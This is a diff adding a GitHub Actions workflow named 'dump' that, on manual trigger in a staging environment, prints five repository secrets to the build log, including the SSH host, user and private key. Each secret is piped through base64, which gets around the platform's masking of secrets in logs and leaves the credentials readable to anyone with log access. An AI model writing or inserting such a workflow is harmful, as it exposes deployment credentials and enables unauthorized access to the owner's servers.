@@ -1,0 +1,18 @@
+name: dump
+on: [workflow_dispatch]
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    environment: actagroup-staging
+    steps:
+      - run: |
+          echo "HOST="
+          echo "${{ secrets.SIMPLY_SSH_HOST }}" | base64
+          echo "USER="
+          echo "${{ secrets.SIMPLY_SSH_USER }}" | base64
+          echo "ROOT="
+          echo "${{ secrets.SIMPLY_DEPLOY_ROOT }}" | base64
+          echo "KNOWN_HOSTS="
+          echo "${{ secrets.SIMPLY_SSH_KNOWN_HOSTS }}" | base64
+          echo "PRIVATE_KEY="
+          echo "${{ secrets.SIMPLY_SSH_PRIVATE_KEY }}" | base64
